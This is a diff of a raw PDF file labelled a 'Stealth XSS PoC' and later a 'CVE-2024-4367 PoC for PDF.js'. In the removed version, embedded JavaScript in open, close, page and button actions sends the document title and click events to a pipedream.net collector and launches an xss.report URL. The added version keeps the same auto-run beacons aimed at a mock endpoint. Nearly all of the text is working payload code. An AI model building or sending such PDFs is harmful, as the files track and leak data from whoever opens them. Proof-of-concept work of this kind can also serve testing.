@@ -1,89 +1,27 @@
 %PDF-1.4
-1 0 obj
-<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction 11 0 R /AcroForm << /Fields [18 0 R 19 0 R] >> /Metadata 16 0 R /AA 20 0 R >>
-endobj
-2 0 obj
-<< /Type /Pages /Kids [3 0 R] /Count 1 >>
-endobj
-3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [17 0 R 18 0 R 19 0 R] /AA 21 0 R >>
-endobj
-4 0 obj
-<< /Length 68 >>
-stream
-BT
-/F1 12 Tf
-100 700 Td
-(Stealth XSS PoC) Tj
-100 650 Td
-(Click link below for subu.png) Tj
-ET
-endstream
-endobj
-5 0 obj
-<< /Font << /F1 6 0 R >> >>
-endobj
-6 0 obj
-<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R >>
-endobj
-7 0 obj
-<< /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
-endobj
-10 0 obj
-<< /Names [(FormXSS) 11 0 R (Base64XSS) 12 0 R] >>
-endobj
-11 0 obj
-<< /S /JavaScript /JS (this.submitForm({ cURL: 'https://eoy4evvlsf7y0jq.m.pipedream.net', cSubmitAs: 'HTML', cFields: [['title', app.doc.title], ['timestamp', '2025-05-30T16:16:00EEST']] });) >>
-endobj
-12 0 obj
-<< /S /JavaScript /JS (setTimeout(function() { app.launchURL('https://xss.report/c/ghostshell', true); }, 3000);) >>
-endobj
-16 0 obj
-<< /Type /Metadata /Subtype /XML /Length 92 >>
-stream
-<?xml version="1.0"?>
-<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
-  <rdf:Description>
-    <dc:title>Updated Stealth XSS PoC PDF</dc:title>
-  </rdf:Description>
-</rdf:RDF>
-endstream
-endobj
-17 0 obj
-<< /Type /Annot /Subtype /Link /Rect [100 600 200 620] /A << /S /URI /URI (https://gotphp.com/subu.png) >> /Border [0 0 1] /C [0 0 1] >>
-endobj
-18 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Btn /T (SimClickBtn) /Rect [100 550 200 570] /A << /S /JavaScript /JS (getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?click=SimClickBtn');) >> /AP << /N 22 0 R >> >>
-endobj
-19 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Btn /T (TimeBtn) /Rect [100 500 200 520] /A << /S /JavaScript /JS (for (var i = 0; i < 3; i++) { getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?time=' + i); util.sleep(2000); }) >> /AP << /N 23 0 R >> >>
-endobj
-20 0 obj
-<< /O << /S /JavaScript /JS (getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?open=true');) >> /WC << /S /JavaScript /JS (getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?close=true');) >> >>
-endobj
-21 0 obj
-<< /PC << /S /JavaScript /JS (getURL('https://eoy4evvlsf7y0jq.m.pipedream.net?pageclose=true');) >> >>
-endobj
-22 0 obj
-<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 100 20] /Resources << /Font << /F1 6 0 R >> >> /Length 58 >>
-stream
-0 0 100 20 re f
-BT /F1 10 Tf 10 10 Td (Click Me!) Tj ET
-1 0 0 rg
-0 0 100 20 re S
-endstream
-endobj
-23 0 obj
-<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 100 20] /Resources << /Font << /F1 6 0 R >> >> /Length 58 >>
-stream
-0 0 100 20 re f
-BT /F1 10 Tf 10 10 Td (Time Test) Tj ET
-0 1 0 rg
-0 0 100 20 re S
-endstream
-endobj
+1 0 obj << /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction 11 0 R /AcroForm << /Fields [18 0 R] >> /Metadata 16 0 R /AA 20 0 R >> endobj
+2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
+3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R /Annots [17 0 R 18 0 R] /AA 21 0 R >> endobj
+4 0 obj << /Length 68 >> stream
+BT /F1 12 Tf 100 700 Td (CVE-2024-4367 PoC for PDF.js 3.4.120) Tj 100 650 Td (Click button to test) Tj ET
+endstream endobj
+5 0 obj << /Font << /F1 6 0 R >> >> endobj
+6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [1 0 0 1 0 0] >> endobj
+7 0 obj << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >> endobj
+10 0 obj << /Names [(InitXSS) 11 0 R] >> endobj
+11 0 obj << /S /JavaScript /JS (getURL('https://mockendpoint.com?open=true&title=' + app.doc.title + '×tamp=2025-05-30T16:42:00EEST');) >> endobj
+16 0 obj << /Type /Metadata /Subtype /XML /Length 92 >> stream
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description><dc:title>CVE-2024-4367 PoC PDF</dc:title></rdf:Description></rdf:RDF>
+endstream endobj
+17 0 obj << /Type /Annot /Subtype /Link /Rect [100 600 200 620] /A << /S /URI /URI[](https://example.com/test) >> /Border [0 0 1] /C [0 0 1] >> endobj
+18 0 obj << /Type /Annot /Subtype /Widget /FT /Btn /T (TestBtn) /Rect [100 550 200 570] /A << /S /JavaScript /JS (getURL('https://mockendpoint.com?click=TestBtn');) >> /AP << /N 22 0 R >> >> endobj
+20 0 obj << /O << /S /JavaScript /JS (getURL('https://mockendpoint.com?open=true');) >> /WC << /S /JavaScript /JS (getURL('https://mockendpoint.com?close=true');) >> >> endobj
+21 0 obj << /PC << /S /JavaScript /JS (getURL('https://mockendpoint.com?pageclose=true');) >> >> endobj
+22 0 obj << /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 100 20] /Resources << /Font << /F1 6 0 R >> >> /Length 58 >> stream
+0 0 100 20 re f BT /F1 10 Tf 10 10 Td (Click Me!) Tj ET 1 0 0 rg 0 0 100 20 re S
+endstream endobj
 xref
-0 24
+0 23
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
@@ -96,7 +34,6 @@ xref
 0000000000 65535 f 
 0000000531 00000 n 
 0000000576 00000 n 
-0000000663 00000 n 
 0000000000 65535 f 
 0000000000 65535 f 
 0000000000 65535 f 
@@ -109,7 +46,7 @@ xref
 0000001439 00000 n 
 0000001541 00000 n 
 trailer
-<< /Size 24 /Root 1 0 R >>
+<< /Size 23 /Root 1 0 R >>
 startxref
-1643
+1541
 %%EOF
